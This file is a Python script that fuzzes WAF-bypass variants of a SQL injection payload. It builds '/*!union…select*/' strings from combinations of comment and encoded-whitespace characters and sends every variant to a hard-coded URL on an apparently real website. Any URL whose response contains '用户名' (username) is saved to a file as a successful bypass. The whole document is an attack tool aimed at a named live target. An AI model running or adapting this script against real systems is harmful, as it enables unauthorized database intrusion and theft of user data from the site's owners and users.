import requests
import sys
fuzz_zs = ['/*','*/','/*!','/**/','?','/','*','=','`','!','%','.','-','+']
fuzz_sz = ['']
fuzz_ch = ['%0a','%0b','%0c','%0d','%0e','%0f','%0g','%0h','%0i','%0j']

fuzz = fuzz_zs + fuzz_sz + fuzz_ch
headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36"}
target = 'http://zy.wjjy.cn/wjqwjdejmyx/_item?y=622125&&m=39mlid=417636'
nums = len(fuzz) ** 5
num = 0

for a in fuzz:
    for b in fuzz:
        for c in fuzz:
            for d in fuzz:
                for e in fuzz:
                    num += 1
                    payload = "/*!union" + a + b + c + d + e + "select*/ 1,2,3"
                    url = target + payload
                    print('[{}] {}'.format(num, url))
                    res = requests.get(url)
                    if '用户名' in res.text:
                        with open('ret.txt','at',encoding='utf-8') as f:
                            f.writelines(url + '\n')